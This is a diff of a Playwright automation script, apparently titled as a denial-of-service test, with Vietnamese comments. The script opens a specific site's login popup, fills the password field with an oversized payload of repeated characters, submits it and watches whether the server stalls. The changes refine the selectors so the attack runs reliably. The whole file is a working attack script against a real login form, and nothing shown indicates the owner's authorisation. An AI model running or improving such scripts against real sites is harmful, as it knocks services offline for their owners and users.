@@ -1,4 +1,4 @@
-// attack_script_dos_test.js (Version 7 - Final with Hyper-Specific Chained Selector)
+// attack_script_dos_test.js (Version 10 - Final, Relational Selector for Submit Button)
 
 const { chromium } = require('playwright');
 
@@ -27,7 +27,7 @@ const PAYLOAD_CHARACTER = 'A';
     console.log('------------------------------------');
 
     try {
-      // --- BƯỚC 0: XỬ LÝ CÁC LỚP PHỦ (VÍ DỤ: COOKIE BANNER) ---
+      // --- BƯỚC 0: XỬ LÝ COOKIE BANNER ---
       try {
         console.log('Đang kiểm tra và xử lý cookie banner (nếu có)...');
         const cookieButton = page.getByRole('button', { name: /Accept|Allow|Đồng ý|Chấp nhận/i });
@@ -37,35 +37,28 @@ const PAYLOAD_CHARACTER = 'A';
         console.log('ℹ️ Không tìm thấy cookie banner, hoặc đã xử lý xong. Bỏ qua.');
       }
 
-      // --- BƯỚC 1: Nhấn vào nút "Login" để hiển thị POPUP ---
+      // --- BƯỚC 1: Nhấn vào LINK "Login" để mở POPUP ---
       console.log('Đang tìm và nhấn vào phần tử "Login" để hiển thị popup...');
-      
-      // THAY ĐỔI CUỐI CÙNG: Dùng selector đã lọc để đảm bảo chỉ có 1 kết quả.
-      // "Tìm một thẻ <a> có class 'w-login-popup' VÀ có chứa text 'Login'"
       await page.locator('a.w-login-popup').filter({ hasText: 'Login' }).click();
-      
       console.log('✅ Đã nhấn phần tử "Login". Chờ popup hiển thị...');
       
       // --- BƯỚC 2: Chờ cho form bên trong POPUP hiển thị ---
       await page.locator('#username').waitFor({ state: 'visible', timeout: 10000 });
       console.log('✅ Popup đăng nhập đã hiển thị.');
 
-
-      // --- CÁC BƯỚC CÒN LẠI ---
-      // 3. Tìm và điền vào ô email
+      // --- BƯỚC 3 & 4: Điền thông tin ---
       await page.locator('#username').fill(EMAIL_TEST);
-
-      // 4. Tìm và điền PAYLOAD LỚN vào ô mật khẩu
       await page.locator('#password').fill(payload);
       
-      // 5. Nhấn nút Đăng nhập bên trong form
-      await page.locator('#login_certapple button[type="submit"]').click();
+      // --- BƯỚC 5: Nhấn NÚT SUBMIT (Mũi tên) bên cạnh ô mật khẩu ---
+      console.log('Đang tìm và nhấn vào nút submit (mũi tên) để gửi form...');
+      // THAY ĐỔI CUỐI CÙNG: Dùng selector quan hệ để tìm nút submit ngay cạnh ô password.
+      await page.locator('#password').locator('..').locator('button[type="submit"]').click();
 
-      // 6. Chờ cho trang phản hồi
+      // --- BƯỚC 6 & 7: Chờ phản hồi và kiểm tra kết quả ---
       console.log('Đã gửi payload. Đang chờ phản hồi từ server...');
       await page.waitForLoadState('networkidle', { timeout: 60000 });
 
-      // 7. Kiểm tra kết quả nếu server phản hồi kịp thời
       const content = await page.content();
       const pageTitle = await page.title();
 
@@ -79,8 +72,8 @@ const PAYLOAD_CHARACTER = 'A';
       
     } catch (e) {
       if (e.message.includes('timeout')) {
-        if (e.message.includes("filter({ hasText: 'Login' })")) {
-            console.error(`::error::Không tìm thấy selector đã lọc 'a.w-login-popup' có chữ 'Login'. Trang web có thể đã thay đổi.`);
+        if (e.message.includes("locator('#password').locator('..')")) {
+            console.error(`::error::Không tìm thấy nút submit bên cạnh ô mật khẩu.`);
         } else if (e.message.includes("locator('#username').waitFor")) {
             console.error(`::error::Đã click được "Login" nhưng popup hoặc ô username không xuất hiện sau 10 giây.`);
         } else if (e.message.includes('waitForLoadState')) {
